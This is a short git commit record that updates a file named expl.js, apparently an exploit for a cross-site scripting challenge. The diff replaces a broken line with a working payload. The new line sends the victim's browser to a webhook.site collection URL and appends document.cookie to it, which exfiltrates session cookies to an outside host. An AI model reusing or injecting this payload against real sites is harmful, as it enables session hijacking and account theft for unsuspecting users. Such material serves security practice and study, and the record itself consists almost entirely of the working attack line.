5ac37a5344879d08d774d21cf9ce8f3f6e9ba234
shyeun <96280288+shyeun@users.noreply.github.com>
2023-02-08 14:43:11 +0900

    Update expl.js

--- expl.js
+++ expl.js
@@ -1,1 +1,1 @@
-location.href='https://webhook.site/ab70cf71-8003-4fb9-add9-38339f2fe011?a='%2blocation.cookie
+location.href='https://webhook.site/ab70cf71-8003-4fb9-add9-38339f2fe011?a='+document.cookie
